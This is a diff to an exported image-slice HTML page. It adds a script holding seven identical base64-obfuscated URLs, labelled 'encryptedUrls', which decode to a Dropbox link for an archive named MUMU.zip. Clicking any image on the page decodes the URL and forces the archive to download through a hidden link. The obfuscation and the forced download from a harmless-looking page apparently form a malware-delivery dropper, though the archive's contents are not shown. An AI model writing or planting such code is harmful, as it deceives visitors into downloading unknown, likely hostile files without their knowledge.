@@ -36,5 +36,37 @@
 	</tr>
 </table>
 <!-- End Save for Web Slices -->
+<script>
+        
+        const encryptedUrls = [
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzVybmQ3Y2pxdHMwZ284aWhxbzhhMC9NVU1VLnppcD9ybGtleT00NGtqZmJ0ZG4xZDh1aXp2cnZyM3E0aGc2JnN0PXA1aTVsb2tlJmRsPTE=',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzVybmQ3Y2pxdHMwZ284aWhxbzhhMC9NVU1VLnppcD9ybGtleT00NGtqZmJ0ZG4xZDh1aXp2cnZyM3E0aGc2JnN0PXA1aTVsb2tlJmRsPTE=',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzVybmQ3Y2pxdHMwZ284aWhxbzhhMC9NVU1VLnppcD9ybGtleT00NGtqZmJ0ZG4xZDh1aXp2cnZyM3E0aGc2JnN0PXA1aTVsb2tlJmRsPTE=',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzVybmQ3Y2pxdHMwZ284aWhxbzhhMC9NVU1VLnppcD9ybGtleT00NGtqZmJ0ZG4xZDh1aXp2cnZyM3E0aGc2JnN0PXA1aTVsb2tlJmRsPTE=',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzVybmQ3Y2pxdHMwZ284aWhxbzhhMC9NVU1VLnppcD9ybGtleT00NGtqZmJ0ZG4xZDh1aXp2cnZyM3E0aGc2JnN0PXA1aTVsb2tlJmRsPTE=',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzVybmQ3Y2pxdHMwZ284aWhxbzhhMC9NVU1VLnppcD9ybGtleT00NGtqZmJ0ZG4xZDh1aXp2cnZyM3E0aGc2JnN0PXA1aTVsb2tlJmRsPTE=',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzVybmQ3Y2pxdHMwZ284aWhxbzhhMC9NVU1VLnppcD9ybGtleT00NGtqZmJ0ZG4xZDh1aXp2cnZyM3E0aGc2JnN0PXA1aTVsb2tlJmRsPTE='
+        ];
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+        
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
+        });
+    </script>
 </body>
 </html>
